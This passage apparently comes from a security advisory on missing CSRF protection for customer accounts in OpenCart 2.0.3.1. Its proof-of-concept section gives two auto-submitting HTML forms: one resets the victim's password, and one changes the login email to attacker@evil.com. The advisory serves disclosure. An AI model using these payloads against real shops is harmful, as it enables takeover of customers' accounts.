2. Vulnerability Description

While CSRF protection exists for the actions of an admin, it does not exist for
customers. This means that customer accounts can be compromised by an attacker
if the victim visits an attacker controlled website while logged in.

This issue was already discovered in 2013 by Saadat Ullah, but new versions of
OpenCart are still vulnerable as no fix has been released.

3. Proof of Concept

Change Password:


<form name="myform" method="post" action="http://localhost/opencart-2.0.3.1/upload/index.php?route=account/password" >
    <input type="hidden" name="password" value="12345">
    <input type="hidden" name="confirm" value="12345">
</form>
<script>document.myform.submit();</script>

Change profile information, including email address, which is used when logging
in:


<form name="myform" method="post" action="http://localhost/opencart-2.0.3.1/upload/index.php?route=account/edit" >
    <input type="hidden" name="currency" value="USD">
    <input type="hidden" name="language" value="en">
    <input type="hidden" name="firstname" value="Jane">
    <input type="hidden" name="lastname" value="Smith">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="telephone" value="1234567">
</form>
<script>document.myform.submit();</script>
